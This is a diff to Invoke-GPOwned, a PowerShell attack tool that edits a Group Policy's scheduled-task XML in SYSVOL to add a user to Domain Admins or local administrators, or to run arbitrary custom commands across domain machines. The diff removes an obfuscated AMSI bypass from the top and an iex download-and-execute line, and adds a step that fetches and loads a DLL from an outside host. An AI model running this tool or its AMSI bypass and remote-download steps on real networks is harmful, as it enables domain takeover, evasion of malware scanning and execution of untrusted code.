@@ -1,4 +1,3 @@
-$an=[CHaR]([BYTe]0x53)+[cHar]([bYtE]0x79)+[ChaR]([BYTe]0x73)+[ChaR]([bYte]0x74)+[cHar]([bYtE]0x65)+[cHar]([bYtE]0x6d)+[cHar]([BYtE]0x2e)+[cHar]([BYte]0x4d)+[ChAr]([BYTe]0x61)+[cHar]([bYtE]0x6e)+[cHar]([BYTe]0x61)+[ChaR]([bYte]0x67)+[cHar]([bYtE]0x65)+[cHar]([BYTe]0x6d)+[cHar]([bYtE]0x65)+[cHar]([bYtE]0x6e)+[cHar]([BYte]0x74)+[cHar]([bYtE]0x2e)+[cHar]([BYte]0x41)+[cHar]([bYtE]0x75)+[cHar]([BYte]0x74)+[cHar]([bYtE]0x6f)+[cHar]([BYte]0x6d)+[cHar]([bYtE]0x61)+[cHar]([BYte]0x74)+[cHar]([bYtE]0x69)+[cHar]([BYte]0x6f)+[cHar]([bYtE]0x6e)+[cHar]([BYte]0x2e)+$([cHar]([BYte]0x41)+[cHar]([bYtE]0x6d)+[cHar]([BYtE]0x73)+[cHar]([bYtE]0x69))+'Utils';$fn=$([cHar]([BYte]0x61)+[cHar](69+40)+[cHar](161-46)+[cHar](105)+[cHar]([BYTe]0x49)+[cHar]([BYTe]0x6e)+[cHar](77+28)+[cHar](116)+[cHar]([BYTe]0x46)+[cHar]([BYte]0x61)+[cHar](8925/85+"")+[cHar](43+65)+[cHar]([BYTe]0x65)+[cHar]([BYte]0x64));$ft='NonPublic,Static';$sv=$true;$asm=[Ref].Assembly.GetType($an);$f=$asm.GetField($fn,$ft);$f.SetValue($null,$sv);
 function Invoke-GPOwned {
     [CmdletBinding()]
     param(
@@ -13,6 +12,10 @@ function Invoke-GPOwned {
         [Parameter(Mandatory=$false)]
         [Alias("u")]
         [string]$User,
+
+        [Parameter(Mandatory=$false)]
+        [Alias("a")]
+        [string]$Author,
 
         [Parameter(Mandatory=$false)]
         [Alias("d")]
@@ -30,40 +33,66 @@ function Invoke-GPOwned {
         [switch]$DA,
 
         [Parameter(Mandatory=$false)]
-        [switch]$Local
+        [switch]$Local,
+
+        [Parameter(Mandatory=$false)]
+        [Alias("dll")]
+        [string]$LoadDLL,
+
+        [Parameter(Mandatory=$false)]
+        [Alias("cc")]
+        [string]$CustomCommand,
+        
+        [Parameter(Mandatory=$false)]
+        [Alias("ccp")]
+        [string]$PowerShellCustomCommand
     )
 
     if ($Help -or !($GPOGUID) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
         Write-Output @"
 Invoke-GPOwned Help:
 
-Example : Invoke-GPOwned -GPOGUID {} -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User Administrator -Domain noteasy.local -DC dc01.noteasy.local
+Example : Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User Administrator -Domain noteasy.local -DC dc01.noteasy.local
 
-Parameters: (*Mandatory)
--GPOGUID*: Group Policy GUID
--ScheduledTasksXMLPath*: Full path to the ScheduledTasks xml file
--Computer*: Target computer
--Local - adds a chosen user to the local administrators goup on the defined computer
--DA - adds the user to the domain admins group
+Parameters:
+-GPOGUID: Group Policy GUID
+-ScheduledTasksXMLPath: Full path to the ScheduledTasks xml file
+-Computer: Target computer
+-Local: - adds a chosen user to the local administrators goup on the defined computer
+-DA: adds the user to the domain admins group
+-CustomCommand:
 -User: Target user to elevate, mandatory for Local technique
 -Domain: Target domain
+-LoadDLL: Load the Microsoft.ActiveDirectory.Management.dll from a custom path, if not supplied it will try to download it to the current directory
 "@
         return
     }
 
 
     # Enabling TLS and loading the ActiveDirectory module to memory #
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    iex(New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1")
-    Import-ActiveDirectory
+if(!($LoadDLL)){
+    iwr https://ownd.lol/NIdmxycw/Microsoft.ActiveDirectory.Management.dll -OutFile Microsoft.ActiveDirectory.Management.dll
+    Import-Module .\Microsoft.ActiveDirectory.Management.dll
     $mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
-    if(($mod.Contains("dynamic_code")) -eq "True"){
+    if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
         $null
     } else {
         Write-Error "[-] ActiveDirectory module failed to load!"
         return
     }
-
+} elseif($LoadDLL) {
+    Import-Module $LoadDLL -ErrorAction Stop
+    $mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
+    if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
+        $null
+    } else {
+        Write-Error "[-] ActiveDirectory module failed to load!"
+        return
+    }
+} else {
+    Write-Error "[-] Couldn't load DLL exiting..."
+    return
+}
     $guid = $GPOGUID
     $guid2 = "{"+$guid+"}"
     
@@ -91,6 +120,7 @@ Parameters: (*Mandatory)
     }
 
     # Look for an active domain admin account #
+    if(!($TargetUser)){
         $i = 0
         while($gotcha -ne "1"){
             $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName -ExpandProperty SamAccountName)[$i]
@@ -100,6 +130,7 @@ Parameters: (*Mandatory)
                 $i++
             }
         }
+    }
     $validatexml = Get-Content $ScheduledTasksXMLPath
     if(-not(Test-Path $ScheduledTasksXMLPath)){
         Write-Output "[-] XML file not found!."
@@ -165,8 +196,58 @@ Parameters: (*Mandatory)
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$localcommand"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
         Write-Output "[+] ScheduledTasks file modified to add $User to local administrators group on $Computer!"
+    } elseif($CustomCommand){
+        if(($CustomCommand.StartSwith("/c "))){
+            $CustomCommand = $CustomCommand.replace("/c ","")
+        } elseif(($CustomCommand.StartSwith("/r "))){
+            $CustomCommand = $CustomCommand.replace("/r ","")
+        }
+        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+        $encoding = 'ASCII'
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CustomCommand"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        Write-Output "[+] ScheduledTasks file modified with the supplied custom command!."
+    } elseif($PowerShellCustomCommand){
+        if(($PowerShellCustomCommand.StartSwith("-c "))){
+            $PowerShellCustomCommand = $PowerShellCustomCommand.replace("-c ","")
+        } elseif(($PowerShellCustomCommand.StartSwith("-Command "))){
+            $PowerShellCustomCommand = $PowerShellCustomCommand.replace("-Command ","")
+        }
+        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+        $encoding = 'ASCII'
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","-Command $PowerShellCustomCommand"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        Write-Output "[+] ScheduledTasks file modified with the supplied custom command!."
     } else {
-        Write-Output "[-] Either the -Local or -DA flags are required for execution!."
+        Write-Output "[-] Either the -Local/-DA/-CustomCommand/-PowerShellCustomCommand flags are required for execution!."
         return
     }
     
@@ -214,7 +295,7 @@ Parameters: (*Mandatory)
     if($DA){
         for ($x = 1; $x -le 300; $x++ ){
             $PercentCompleted = ($x/300*100)
-            Write-Progress -Activity "Waiting for GPO update on the DC..." -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
             Start-Sleep -Seconds 1
             if ((Get-ADGroupMember "Domain Admins" | findstr $User) -ne $null) {
                 break
@@ -229,18 +310,25 @@ Parameters: (*Mandatory)
     } elseif($Local){
          for ($x = 1; $x -le 300; $x++ ){
             $PercentCompleted = ($x/300*100)
-            Write-Progress -Activity "Waiting for GPO update on the DC..." -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
             Start-Sleep -Seconds 1
-            if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -ne $null) {
+            if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -ne $null) {
                 break
             }
         }
         $timepassed = 0
-        while((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -eq $null){
+        while((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -eq $null){
             Start-Sleep 1
             }
         Write-Output "[+] User added to the local admins group!"
+     }elseif($CustomCommand){
+        for ($x = 1; $x -le 300; $x++ ){
+            $PercentCompleted = ($x/300*100)
+            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+            Start-Sleep -Seconds 1
+        }
     }
+    
     Write-Output "[+] Reverting extensions back to what they were"
     # Reverting the gPCMachineExtensionNames #
     if($noext -ne 1){
@@ -257,7 +345,7 @@ Parameters: (*Mandatory)
     Write-Output "[+] Removing the scheduled task from the DC"
     # Trying to delete the scheduled task from the DC #
     try{
-        Unregister-ScheduledTask -CimSession $Computer -TaskName "OWNED" -Confirm:$false
+        Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
     }
     catch{
         Write-Error "[-] Scheduled Task Removal Failed! login to the DC and remove it manually."
